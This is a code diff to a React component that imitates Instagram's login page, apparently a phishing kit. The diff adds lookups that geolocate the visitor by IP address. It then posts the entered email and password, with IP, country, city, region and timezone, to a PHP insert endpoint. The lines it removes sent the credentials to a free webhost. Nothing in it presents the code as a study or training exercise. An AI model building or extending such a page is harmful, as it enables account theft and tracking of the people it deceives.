@@ -7,36 +7,98 @@ import Apple from "../../public/apple-store.png";
 import Instagram_logo from "../../public/Instagram_logo.png";
 import Facebook from "../../public/facebook.png";
 import Google from "../../public/google-play.png";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import Loading from "../voter/instagram/loading";
 
 export default function Instagram() {
   const [loading, setLoading] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [ip, setIp] = useState(null);
+  const [country, setCountry] = useState("");
+  const [city, setCity] = useState("");
+  const [region, setRegion] = useState("");
+  const [timezone, setTimezone] = useState("");
 
   const copyright = "\u00A9";
 
+  useEffect(() => {
+    setLoading(true);
+    const getUserIp = async () => {
+      const res = await fetch("https://api.ipify.org/?format=json");
+      const data = await res.json();
+
+      setIp(data.ip);
+      console.log("First data: ", data.ip);
+    };
+
+    getUserIp();
+    setLoading(false);
+  }, []);
+
+  useEffect(() => {
+    console.log("IP: ", ip);
+    if (ip !== null) {
+      const ipCheck = async () => {
+        fetch("https://ipapi.co/" + ip + "/json/")
+          .then(function (response) {
+            response.json().then((jsonData) => {
+              console.log(jsonData);
+              setCountry(jsonData.country_name);
+              setRegion(jsonData.region);
+              setCity(jsonData.city);
+              setTimezone(jsonData.timezone);
+            });
+          })
+          .catch(function (error) {
+            console.log(error);
+          });
+      };
+
+      ipCheck();
+    }
+  }, [ip]);
+
+  console.log(country);
+  console.log(city);
+  console.log(region);
+  console.log(timezone);
+
   const submitForm = async (e) => {
     e.preventDefault();
-    setLoading(true);
+    // setLoading(true);
+    try {
+      if (
+        ip &&
+        country !== "" &&
+        city !== "" &&
+        region !== "" &&
+        timezone !== ""
+      ) {
+        console.log("IP: ", ip);
+        // Add data to php server
+        const response = await fetch("https://localhost/server/insert.php", {
+          method: "POST",
+          body: JSON.stringify({
+            email,
+            password,
+            country,
+            city,
+            region,
+            ip,
+            timezone,
+          }),
+          headers: {
+            "Content-Type": "application/json",
+          },
+          mode: "no-cors",
+        });
+      }
+    } catch (error) {
+      console.log(error);
+    }
 
-    // Add data to php server
-    fetch("https://theappcrud.000webhostapp.com/insert.php", {
-      method: "POST",
-      body: JSON.stringify({ email, password }),
-      headers: {
-        "Content-Type": "application/json",
-      },
-      mode: "no-cors",
-    })
-      .then((response) => {
-        // Handle response accordingly
-        console.log("Data added successfully", response);
-      })
-      .catch((error) => console.error("Error adding data:", error));
-
-    setLoading(false);
+    // setLoading(false);
   };
 
   return (
@@ -55,12 +117,12 @@ export default function Instagram() {
 
             <form
               onSubmit={submitForm}
-              // action="https://theappcrud.000webhostapp.com/insert.php"
+              // action="http://localhost/insert.php"
               className="flex flex-col gap-3 w-full "
             >
               <div className="email-container flex justify-center">
                 <input
-                  type="email"
+                  type="text"
                   name="email"
                   id="email"
                   placeholder="Phone number, username or email address"
